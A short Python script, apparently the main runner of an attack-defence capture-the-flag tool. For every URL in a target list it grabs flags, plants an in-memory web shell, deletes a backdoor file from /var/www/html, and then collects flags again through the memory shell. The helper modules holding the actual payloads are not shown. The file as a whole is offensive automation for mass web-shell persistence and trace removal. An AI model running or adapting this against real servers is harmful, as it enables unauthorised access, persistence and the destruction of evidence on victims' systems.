import asyncio
from core.flags import Flag
from core.shells import Shell
from utils.utils import Utils
from core.urls import Urls
from core.flags import Flag
from config import Config
async def run():
    task_getFlag = [Flag.getFlag(url) for url in Urls.urlList]
    task_writeMemShell = [Shell.writeShell(url) for url in Urls.urlList]
    await asyncio.gather(*task_getFlag)
    await asyncio.gather(*task_writeMemShell)
    task_delBackdoor = [Utils.delete(url,f"/var/www/html/{Config.backdoorPath}") for url in Urls.urlList]
    await asyncio.gather(*task_delBackdoor)
    task_getFlagwithMemShell = [Flag.getFlagwithMemShell(url) for url in Urls.urlList]
    await asyncio.gather(*task_getFlagwithMemShell)